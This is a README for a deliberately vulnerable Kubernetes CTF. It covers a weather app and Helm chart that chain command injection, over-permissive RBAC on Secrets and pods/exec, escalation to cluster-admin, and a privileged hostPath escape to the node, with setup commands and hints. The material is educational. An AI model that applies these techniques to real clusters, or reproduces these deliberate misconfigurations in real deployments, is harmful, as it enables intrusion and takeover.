# Kubernetes CTF chart

A deliberately vulnerable app and Helm chart implementing a 5-stage
privilege-escalation chain.

This is the full CTF showcased into the "Breaking (into) a Kubernetes
Cluster" lecture at CERN Fall Campus 2026 in Tartu. 
It's meant to run on a **minikube** cluster on your own hardware. Nothing here 
should ever be pointed at shared or production infrastructure.

## Requirements

- Docker (or another driver minikube supports)
- [minikube](https://minikube.sigs.k8s.io/docs/start/)
- `kubectl`
- `helm` 3

## Setup

### 1. Start minikube

```
minikube start
kubectl config use-context minikube
kubectl get nodes           # sanity check: should show one Ready node
```

### 2. Build the app image

```
docker build -t ctf-vulnapp:latest app
```

### 3. Load the image into minikube

minikube runs its own container runtime, it can't see the images 
built by Docker on the host machine:

```
minikube image load ctf-vulnapp:latest --overwrite
```

### 4. Install the chart with Helm

```
helm install ctf . --set image.repository=ctf-vulnapp
```

The chart creates the `ctf` and `ctf-restricted` namespaces itself.

Also verify the rollout status of the following:
```
kubectl -n ctf rollout status deployment/weather-app
kubectl -n ctf rollout status deployment/ctf-internal-app
kubectl -n kube-system rollout status daemonset/ctf-seed-node-flag
```

### 5. Reach the app

```
kubectl -n ctf port-forward svc/weather-app 8080:80
```

And open `http://localhost:8080/` in your browser.

## Getting extra tools into the pod

If an exploit step needs a file or binary that isn't already in the image,
the most reliable way is to serve it from your own machine and pull it 
over the local network:

```
# on your machine, in the folder with the file you want to serve
python3 -m http.server 8000
```

Then, from inside the pod, fetch it from your machine's IP:

```
curl -O http://<your-machine-ip>:8000/<file>
```

`<your-machine-ip>` is the IP minikube itself can reach. If the pod 
can't connect, double check that address and that nothing 
(e.g. firewall) is blocking port 8000 from the minikube VM/container.

## Hints

Try each stage yourself first, but here is a helping hand. 

1. **Flag 1** — The search feature on the weather app talks to the
   underlying operating system and the input is not sanitazed. Find 
   a way to make it run a command of your choosing, get yourself a 
   proper connection to the pod, and look for a flag sitting at the 
   root of its filesystem.
2. **Flag 2** — By using the service account token of the pod, you can 
   list some Kubernetes resources. One of them can lead you to the 
   Secret holding the second flag.
3. **Flag 3** — Look closer at what the weather app's identity can do
   to *other* pods in the namespace. There's an internal-only pod nearby,
   find a way to get a shell inside it, and look at its filesystem.
4. **Flag 4** — The service account of the internal pod is more powerfull.
   Use the permisisons of this pod to become the Cluster admin and find 
   the fourth flag in the neighbouring namespace.
5. **Flag 5** — With full control over the cluster, think about how a pod
   can be configured to mount the node filesystem. The fifth flag is 
   written on the filesystem of the node.

## What's actually going on

1. **Command injection.** The app takes the city you search for and
   drops it straight into a shell command (`shell=True`) without any
   sanitazation to build its reply. Because the command runs on the
   server, anything you sneak past the quoting (eg a `;`, a backtick, a
   `$(...)` ) runs too, as the app's own user inside the pod.
2. **ServiceAccount with too much access.** Every pod gets a
   `ServiceAccount` and a token, mounted at
   `/var/run/secrets/kubernetes.io/serviceaccount/`, that it uses to
   authenticate to the Kubernetes API. That identity is authorized by
   an RBAC `Role` that indicated what resources it can access. 
   This app's `Role` grants `get`/`list` on *all* Secrets in the namespace, 
   including ones it has no legitimate reason to ever read, like the flag.
   So it is enough to use that token to`curl` the Kubernetes API directly 
   and read flag2 out of a Secret.
3. **Lateral movement.** That same `Role` also grants `create` on
   `pods/exec`, and critically, it's not scoped to the app's own pod,
   we can exec in *any* other pod in that namespace. Opening a shell to
   the internal pod gives us access to the whole filesystem of that pod,
   including the flag, but more importantly to the ServiceAccount and 
   token of that pod.
4. **Escalating to cluster admin.** That second pod's ServiceAccount 
   is bound to a `ClusterRole` that allows `create` on `clusterrolebindings`
   plus `bind` on the `cluster-admin` ClusterRole. This allows us to 
   create a new RBAC that will assign the `cluster-admin` role to our
   ServiceAccount. Cluster admin means that we can reach any resource of
   the cluster, we are not bound to our namespace anymore.
5. **Breaking out to the node.** As cluster-admin you can create a pod
   with `securityContext.privileged: true` and a `hostPath` volume
   mounting `/` from the underlying node. That's a legitimate
   Kubernetes feature meant for things like log collectors. This type
   of access technically means that we can mount the actual node 
   filesystem and access anything there. We are no longer bound to the 
   kubernetes cluster. 

## Cleanup

```
helm uninstall ctf
minikube delete
```

Note: `minikube delete` wipes the node's disk along with it, so flag5 goes
with it too — no manual cleanup needed. If you just unistall the helm chart,
you need to also remove the flag 5.
